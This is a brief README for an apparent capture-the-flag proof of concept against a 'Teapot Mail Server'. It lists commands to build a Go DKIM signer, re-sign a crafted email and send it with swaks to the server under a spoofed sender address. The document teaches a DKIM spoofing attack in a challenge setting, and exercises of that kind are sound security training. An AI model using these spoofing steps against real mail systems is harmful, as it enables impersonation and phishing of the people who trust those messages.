# Aliyun CTF Teapot Mail Server DKIM spoofing fast poc

## Usage

update file of `<your domain>` to your domain and make the DKIM for your domain

Save your private key as mail.pem

```bash
go build -o signer.exe signer.go
./signer.exe [mailname].eml
# find the bodyhash
./signer.exe [mailname].eml [bodyhash string]
swaks --data output2.eml \
  --to admin --from admin_required@outlook.com \
  --server TheTeapotServer --port 25
```

